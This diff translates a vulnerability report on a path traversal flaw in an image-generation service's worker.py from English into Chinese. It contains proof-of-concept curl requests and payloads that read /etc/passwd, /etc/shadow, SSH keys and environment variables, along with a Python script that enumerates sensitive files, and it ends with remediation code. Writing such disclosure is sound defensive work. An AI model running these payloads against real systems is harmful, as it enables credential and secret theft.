@@ -1,23 +1,23 @@
-# VULN-DF-PY-001: Path Traversal (Arbitrary File Read)
+# VULN-DF-PY-001: image 参数未验证路径致任意文件读取
 
-## Vulnerability Summary
+## 漏洞摘要
 
-| Field | Value |
+| 字段 | 值 |
 |-------|-------|
 | **ID** | VULN-DF-PY-001 |
-| **Type** | Path Traversal (Read) |
-| **CWE** | CWE-22: Improper Limitation of a Pathname to a Restricted Directory |
-| **Severity** | High |
-| **Confidence** | 85 (CONFIRMED) |
-| **Location** | `examples/service/worker.py:140-141` |
-| **Function** | `generate()` |
-| **Source Module** | examples/service |
+| **类型** | 路径遍历（读取） |
+| **CWE** | CWE-22: 路径名限制不当（Improper Limitation of a Pathname to a Restricted Directory） |
+| **严重程度** | 高 |
+| **可信度** | 85（已确认） |
+| **位置** | `examples/service/worker.py:140-141` |
+| **函数** | `generate()` |
+| **源模块** | examples/service |
 
-## Vulnerability Description
+## 漏洞描述
 
-The `image` field from HTTP requests is passed directly to `Image.open()` without any path validation or sanitization. An attacker can exploit this vulnerability to read arbitrary files on the server by using path traversal sequences (`../`) in the `image` parameter.
+来自 HTTP 请求的 `image` 字段在没有任何路径验证或清理的情况下直接传递给 `Image.open()`。攻击者可以利用此漏洞，通过在 `image` 参数中使用路径遍历序列（`../`）来读取服务器上的任意文件。
 
-### Vulnerable Code
+### 漏洞代码
 
 ```python
 # examples/service/worker.py:139-141
@@ -26,24 +26,24 @@ if request.image is not None:
     logging.info(f"Input image: {request.image}")
 ```
 
-### Attack Chain
+### 攻击链
 
 ```
 HTTP POST /generate → GeneratorRequest(image=...) → worker.py:generate() → Image.open(request.image)
 ```
 
-## Exploitation Analysis
+## 利用分析
 
-### Attack Vector
+### 攻击向量
 
-1. **Network Accessible**: The service binds to `0.0.0.0:6000` with **no authentication**
-2. **Direct Input**: The `image` field is a Pydantic `Optional[str]` with no validation beyond type checking
-3. **No Sanitization**: No path traversal checks, no whitelist, no symlink checks
-4. **PIL.Image.open()**: Accepts any path and attempts to read it as an image file
+1. **网络可访问**：服务绑定到 `0.0.0.0:6000`，**无需身份验证**
+2. **直接输入**：`image` 字段是 Pydantic `Optional[str]` 类型，除了类型检查外没有其他验证
+3. **无清理**：没有路径遍历检查、没有白名单、没有符号链接检查
+4. **PIL.Image.open()**：接受任何路径并尝试将其作为图像文件读取
 
-### Exploit Scenarios
+### 利用场景
 
-#### Scenario 1: Sensitive File Disclosure (Linux)
+#### 场景 1：敏感文件泄露（Linux）
 
 ```http
 POST /generate HTTP/1.1
@@ -58,9 +58,9 @@ Content-Type: application/json
 }
 ```
 
-**Result**: The server attempts to open `/etc/passwd` as an image. While PIL may fail to parse it as an image, the file contents may be logged or exposed through error messages.
+**结果**：服务器尝试将 `/etc/passwd` 作为图像打开。虽然 PIL 可能无法将其解析为图像，但文件内容可能会被记录或通过错误消息泄露。
 
-#### Scenario 2: Credential File Extraction
+#### 场景 2：凭证文件提取
 
 ```json
 {
@@ -68,9 +68,9 @@ Content-Type: application/json
 }
 ```
 
-**Result**: Attempts to read SSH private key.
+**结果**：尝试读取 SSH 私钥。
 
-#### Scenario 3: Application Configuration Disclosure
+#### 场景 3：应用程序配置泄露
 
 ```json
 {
@@ -78,9 +78,9 @@ Content-Type: application/json
 }
 ```
 
-**Result**: Read model configuration files containing sensitive parameters.
+**结果**：读取包含敏感参数的模型配置文件。
 
-#### Scenario 4: Absolute Path Access
+#### 场景 4：绝对路径访问
 
 ```json
 {
@@ -88,58 +88,59 @@ Content-Type: application/json
 }
 ```
 
-**Result**: Read environment variables which may contain secrets (API keys, database credentials).
+**结果**：读取环境变量，其中可能包含机密信息（API 密钥、数据库凭证）。
 
-### Error-Based Information Disclosure
+### 基于错误的信息泄露
 
-Even when PIL fails to parse non-image files, valuable information can be extracted:
+即使 PIL 无法解析非图像文件，也可以提取有价值的信息：
 
-1. **File Existence Validation**: Error message indicates if file exists
-2. **Path Enumeration**: Can enumerate directory structure through errors
-3. **File Size Leakage**: PIL error messages often include file metadata
-4. **Content Leakage**: Error handling may log file contents
+1. **文件存在性验证**：错误消息指示文件是否存在
+2. **路径枚举**：可以通过错误枚举目录结构
+3. **文件大小泄露**：PIL 错误消息通常包含文件元数据
+4. **内容泄露**：错误处理可能会记录文件内容
 
-### Impact Assessment
+### 影响评估
 
-| Impact Category | Severity | Description |
+| 影响类别 | 严重程度 | 描述 |
 |-----------------|----------|-------------|
-| **Information Disclosure** | **High** | Arbitrary file read enables extraction of credentials, secrets, and sensitive data |
-| **Privilege Escalation** | **Medium** | SSH keys, API tokens can enable further compromise |
-| **System Enumeration** | **High** | `/proc/*` filesystem enables detailed system reconnaissance |
-| **Business Impact** | **High** | Model weights, proprietary data, customer information at risk |
+| **信息泄露** | **高** | 任意文件读取可能导致凭证、机密和敏感数据被提取 |
+| **权限提升** | **中** | SSH 密钥、API 令牌可能导致进一步入侵 |
+| **系统枚举** | **高** | `/proc/*` 文件系统可实现详细的系统侦察 |
+| **业务影响** | **高** | 模型权重、专有数据、客户信息面临风险 |
 
-### Attack Prerequisites
+### 攻击前提条件
 
-| Requirement | Status |
+| 要求 | 状态 |
 |-------------|--------|
-| Network access to port 6000 | Required (no firewall assumed) |
-| Authentication | **NONE** - service is unauthenticated |
-| File permissions | Files readable by service process user |
-| PIL compatibility | Not required for enumeration attacks |
+| 端口 6000 的网络访问 | 必需（假设无防火墙） |
+| 身份验证 | **无** - 服务无需身份验证 |
+| 文件权限 | 服务进程用户可读的文件 |
+| PIL 兼容性 | 枚举攻击不需要 |
 
-## Proof of Concept
+## 概念验证
 
-### Basic Path Traversal Test
+### 基本路径遍历测试
 
 ```bash
-# Test relative path traversal
+# 测试相对路径遍历
 curl -X POST http://target:6000/generate \
   -H "Content-Type: application/json" \
   -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"../../../etc/passwd"}'
 
-# Test absolute path access
+# 测试绝对路径访问
 curl -X POST http://target:6000/generate \
   -H "Content-Type: application/json" \
   -d '{"prompt":"test","sample_steps":40,"task":"i2v-A14B","image":"/etc/shadow"}'
 ```
 
-### Automated Enumeration Script
+### 自动化枚举脚本
 
 ```python
 #!/usr/bin/env python3
 import requests
 import sys
 
+# 敏感文件列表
 SENSITIVE_FILES = [
     "/etc/passwd",
     "/etc/shadow",
@@ -159,15 +160,15 @@ def check_file(target, file_path):
             "image": file_path
         }, timeout=10)
         
-        # Check for file existence based on response
+        # 根据响应检查文件是否存在
         if "cannot identify image file" in r.text:
-            print(f"[EXISTS] {file_path}")
+            print(f"[EXISTS] {file_path}")  # [存在]
         elif "No such file" in r.text:
-            print(f"[NOT EXISTS] {file_path}")
+            print(f"[NOT EXISTS] {file_path}")  # [不存在]
         else:
-            print(f"[UNKNOWN] {file_path} - {r.status_code}")
+            print(f"[UNKNOWN] {file_path} - {r.status_code}")  # [未知]
     except Exception as e:
-        print(f"[ERROR] {file_path} - {e}")
+        print(f"[ERROR] {file_path} - {e}")  # [错误]
 
 if __name__ == "__main__":
     target = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:6000"
@@ -175,75 +176,75 @@ if __name__ == "__main__":
         check_file(target, f)
 ```
 
-## Root Cause Analysis
+## 根本原因分析
 
-### Why This Vulnerability Exists
+### 为什么存在此漏洞
 
-1. **Missing Input Validation**: The Pydantic model only validates type (Optional[str]), not content
-2. **Direct File API Usage**: `Image.open()` is used directly instead of safe wrappers
-3. **Unused Security Controls**: The project has `safe_open()` in `mindiesd/utils/file_utils.py` with symlink checks, path length limits, and permission validation - but it's **not used** in this code path
-4. **No Authentication**: The HTTP service has no authentication mechanism
+1. **缺少输入验证**：Pydantic 模型仅验证类型（Optional[str]），不验证内容
+2. **直接使用文件 API**：直接使用 `Image.open()` 而不是安全的包装器
+3. **未使用的安全控制**：项目在 `mindiesd/utils/file_utils.py` 中有 `safe_open()` 函数，包含符号链接检查、路径长度限制和权限验证 - 但在此代码路径中**未使用**
+4. **无身份验证**：HTTP 服务没有身份验证机制
 
-### Comparison with Safe Implementation
+### 与安全实现的比较
 
-**Vulnerable (Current)**:
+**易受攻击（当前）**：
 ```python
-img = Image.open(request.image).convert("RGB")  # No validation
+img = Image.open(request.image).convert("RGB")  # 无验证
 ```
 
-**Safe (Should be)**:
+**安全（应该是）**：
 ```python
 from mindiesd.utils.file_utils import safe_open, standardize_path
 
-# Validate and sanitize path
+# 验证和清理路径
 safe_path = standardize_path(request.image, check_link=True)
-img = Image.open(safe_path).convert("RGB")  # Or use safe_open wrapper
+img = Image.open(safe_path).convert("RGB")  # 或使用 safe_open 包装器
 ```
 
-## Remediation Recommendations
+## 修复建议
 
-### Priority: P1 (Critical - Immediate Fix)
+### 优先级：P1（严重 - 立即修复）
 
-### 1. Path Validation and Sanitization
+### 1. 路径验证和清理
 
 ```python
-# In worker.py - Replace vulnerable code
+# 在 worker.py 中 - 替换易受攻击的代码
 import os
 from pathlib import Path
 
-ALLOWED_IMAGE_DIR = "/data/images"  # Whitelisted directory
+ALLOWED_IMAGE_DIR = "/data/images"  # 白名单目录
 
 def validate_image_path(image_path: str) -> str:
-    """Validate image path is within allowed directory."""
+    """验证图像路径在允许的目录内。"""
     if not image_path:
-        raise ValueError("Image path cannot be empty")
+        raise ValueError("Image path cannot be empty")  # 图像路径不能为空
     
-    # Resolve to absolute path
+    # 解析为绝对路径
     abs_path = os.path.realpath(image_path)
     
-    # Check against whitelist
+    # 针对白名单检查
     allowed_dir = os.path.realpath(ALLOWED_IMAGE_DIR)
     if not abs_path.startswith(allowed_dir + "/"):
-        raise ValueError(f"Image path must be within {ALLOWED_IMAGE_DIR}")
+        raise ValueError(f"Image path must be within {ALLOWED_IMAGE_DIR}")  # 图像路径必须在 {ALLOWED_IMAGE_DIR} 内
     
-    # Check for symlink (use existing safe_open checks)
+    # 检查符号链接（使用现有的 safe_open 检查）
     if os.path.islink(image_path):
-        raise ValueError("Symbolic links are not allowed")
+        raise ValueError("Symbolic links are not allowed")  # 不允许符号链接
     
-    # Validate file extension
+    # 验证文件扩展名
     allowed_extensions = {".jpg", ".jpeg", ".png", ".bmp", ".webp"}
     if Path(abs_path).suffix.lower() not in allowed_extensions:
-        raise ValueError(f"Invalid image extension: {Path(abs_path).suffix}")
+        raise ValueError(f"Invalid image extension: {Path(abs_path).suffix}")  # 无效的图像扩展名
     
     return abs_path
 
-# Usage in generate()
+# 在 generate() 中使用
 if request.image is not None:
     safe_path = validate_image_path(request.image)
     img = Image.open(safe_path).convert("RGB")
 ```
 
-### 2. Use Existing Safe File Utilities
+### 2. 使用现有的安全文件工具
 
 ```python
 from mindiesd.utils.file_utils import standardize_path, check_file_safety
@@ -254,22 +255,22 @@ if request.image is not None:
     img = Image.open(safe_path).convert("RGB")
 ```
 
-### 3. Add Authentication
+### 3. 添加身份验证
 
 ```python
-# In server.py - Add authentication middleware
+# 在 server.py 中 - 添加身份验证中间件
 from fastapi import Depends, HTTPException, status
 from fastapi.security import HTTPBearer, HTTPAuthorizationCredentials
 
 security = HTTPBearer()
 
 async def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
-    """Validate API token."""
+    """验证 API 令牌。"""
     valid_tokens = os.environ.get("API_TOKENS", "").split(",")
     if credentials.credentials not in valid_tokens:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid authentication credentials"
+            detail="Invalid authentication credentials"  # 身份验证凭据无效
         )
     return credentials
 
@@ -278,24 +279,24 @@ async def generate_image(
     request: GeneratorRequest,
     _: HTTPAuthorizationCredentials = Depends(verify_token)
 ):
-    # ... existing logic
+    # ... 现有逻辑
 ```
 
-### 4. Network Binding Restriction
+### 4. 网络绑定限制
 
 ```python
-# In server.py - Bind to localhost only in production
-uvicorn.run(app, host="127.0.0.1", port=6000)  # Instead of 0.0.0.0
+# 在 server.py 中 - 在生产环境中仅绑定到本地主机
+uvicorn.run(app, host="127.0.0.1", port=6000)  # 而不是 0.0.0.0
 ```
 
-## Testing Recommendations
+## 测试建议
 
-1. **Unit Tests**: Add tests for path traversal prevention
-2. **Integration Tests**: Verify authentication middleware
-3. **Security Scan**: Run automated path traversal tests
-4. **Penetration Test**: Comprehensive file disclosure testing
+1. **单元测试**：添加路径遍历防护的测试
+2. **集成测试**：验证身份验证中间件
+3. **安全扫描**：运行自动化的路径遍历测试
+4. **渗透测试**：全面的文件泄露测试
 
-## References
+## 参考资料
 
 - [CWE-22: Improper Limitation of a Pathname](https://cwe.mitre.org/data/definitions/22.html)
 - [OWASP Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
